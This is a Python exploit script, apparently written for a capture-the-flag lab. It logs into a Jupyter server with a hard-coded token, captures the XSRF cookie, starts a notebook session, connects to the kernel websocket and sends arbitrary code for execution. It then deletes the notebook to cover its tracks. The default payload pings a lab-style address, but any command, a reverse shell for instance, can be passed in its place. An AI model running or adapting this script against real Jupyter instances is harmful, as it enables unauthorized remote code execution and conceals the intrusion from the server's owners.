#!/usr/bin/python3

import requests
import nbformat
import json
import time
import websocket
import string
import random
from pwn import log
import datetime

ws = websocket.WebSocket()
session_id = ""
def generate_random_string(size: int = 32, charset: str = string.hexdigits):
        return ''.join(random.choices(charset, k=size))

def create_file(session: requests.Session, baseurl, port) -> str:
    url = f"http://{baseurl}:{port}/api/contents"
    data = {"type":"notebook"}
    response = session.post(url, json=data)
    response_json = response.json()
    return response_json["name"]

def update_content(session: requests.Session, file_name, baseurl:str, port:int, payload:str):
    notebook_content = {"content": {"cells": [{"cell_type": "code", "execution_count": None, "metadata": {"trusted": True}, "outputs": [], "source": "{}".format("This is going to be fun")}], "metadata": {"kernelspec": {"display_name": "Python 3 (ipykernel)", "language": "python", "name": "python3"}, "language_info": {"codemirror_mode": {"name": "ipython", "version": 3}, "file_extension": ".py", "mimetype": "text/x-python", "name": "python", "nbconvert_exporter": "python", "pygments_lexer": "ipython3", "version": "3.10.6"}}, "nbformat": 4, "nbformat_minor": 5}, "type": "notebook"}

    url = f"http://{baseurl}:{port}/api/contents/{file_name}"
    response = session.put(url, json=notebook_content)
    response_json = response.json()

    if response.status_code == 200:
        print("good")
    else:
        print("failed to update content... quitting")
        exit()

def upload_and_execute_notebook(session: requests.Session, baseurl:str, port:int, payload:str):
    file_name = create_file(session, baseurl, port)
    data = {"kernel": {"id": None, "name": "python3"}, "name": "", "path": "".format(file_name), "type": "notebook"}
    url = f"http://{baseurl}:{port}/api/sessions"
    
    response = session.post(url=url, json=data)
    if response.status_code == 201:
        response_json = response.json()
        
        # Get the notebook ID from the response
        notebook_id = response_json["id"]
        update_content(session, file_name, baseurl, port, payload)
        execute(session, baseurl, port, payload)

        try:
            delete_url = f"http://{baseurl}:{port}/api/contents/{file_name}"
            delete_response = session.delete(delete_url)
            if delete_response.status_code == 200:
                log.info(f"Successfully deleted used notebook {file_name}")
            else:
                log.info(f"Failed to delete used notebook with response: {delete_response.text}")
        except Exception as e:
            log.info("Failed to delete notebook after using it...")
        
    else:
        log.failure("not good... ", response.text)

def execute(session, baseurl, port, payload):
    kernels = get_kernels(session, baseurl, port)
    kernel_to_use = kernels[0]
    kernel_id = kernel_to_use['id']

    if connect_to_kernel(session, baseurl, port, kernel_id):
        exec_code(payload, baseurl, session_id)

def create_message(session_id, message_type: str, message_id: str, content: dict, channel: str = "shell") -> str:
    return json.dumps({
            "header": {
                "date": datetime.datetime.now().isoformat(),
                "msg_id": message_id,
                "username": "username",
                "session": session_id,
                "msg_type": message_type,
                "version":"5.2"
            },
            "metadata": {"version":"1.0.0"},
            "content": content,
            "buffers": [],
            "parent_header": {},
            "channel": channel
    })

def exec_code(code: str, baseurl, session_id):
    log.info(f"Trying to execute {code} on {baseurl}")

    message_id = generate_random_string().lower()
    ws.send(
        create_message(session_id=session_id,
            message_type="execute_request",
            message_id=message_id,
            content={
                "code": code,
                "silent": True,
                "store_history": False,
                "user_expressions": {},
                "allow_stdin": False,
                "stop_on_error": True
            }
        )
    )

    expected_response_type = "execute_reply"
    done = False
    while not done:
        # need to add timeouts here...
        response = get_response(message_id=message_id)
        while response is None:
            response = get_response(message_id=message_id)

        log.debug(f"\n{json.dumps(response['content'], indent=2)}")
        message_type = response.get("header", {}).get("msg_type", None)
        if message_type != expected_response_type:
            log.debug(f"Got message_type={message_type}(exected: {expected_response_type})")
        else:
            done = True
    
    log.success("Code executed")
    ws.close()

def get_response(message_id: str) -> dict | None:
    message = ws.recv()
    data = json.loads(message)
    if data.get("parent_header", {}).get("msg_id", None) == message_id:
        return data
    return None

def connect_to_kernel(session: requests.Session, baseurl, port, kernel_id: str) -> bool:
    session_id = generate_random_string()
    cookies = ';'.join(f"{key}={value}" for key, value in session.cookies.items())
    try:
        ws.connect(
            f"ws://{baseurl}:{port}/api/kernels/{kernel_id}/channels?session_id={session_id.lower()}",
            header=[f"X-XSRFToken: {session.cookies['_xsrf']}"],
            cookie=cookies
        )
    except websocket.WebSocketException as e:
        log.failure(f"Failed to connect to the websocket\n{e}")
        return False
    
    log.success("Connection to the websocket successful!")
    return True


def get_kernels(session, baseurl, port):
        log.info("Getting running kernels")
        url = f"http://{baseurl}:{port}/api/kernels"
        response = session.get(url)
        if not response.ok:
            log.failed(f"Failed to get kernels: {response.text}")
            exit()

        data = response.json()
        log.success(f"Kernels:\n{json.dumps(data, indent=2)}")
        return data


def exploit_jupyter(baseurl: str = "127.0.0.1", port: int = 8888, payload:str = "import os; os.system('ping -c 5 10.10.14.12');", token: str = "879e56e10a9d23a925c51b85641b40060ce1c65c24449a9b", public_key:str = ""):
    session = requests.session()

    get_login_url = f"http://{baseurl}:{port}/"
    response = session.get(get_login_url)
    xsrf_cookie_value = response.cookies.get("_xsrf")
    session.headers["X-XSRFToken"] = xsrf_cookie_value

    login_action_url = f"http://{baseurl}:{port}/login?next=/tree?"
    login_data = {"password": token, "_xsrf": xsrf_cookie_value}
    log.info(f"Attempting to login with token: {token} and _xsrd: {xsrf_cookie_value}")
    response = session.post(login_action_url, data=login_data)
    
    if response.status_code == 200:
        log.success("Logged in")
        upload_and_execute_notebook(session, baseurl, port, payload)
    else:
        log.failure("Failed to login ", response.text)
        exit()
        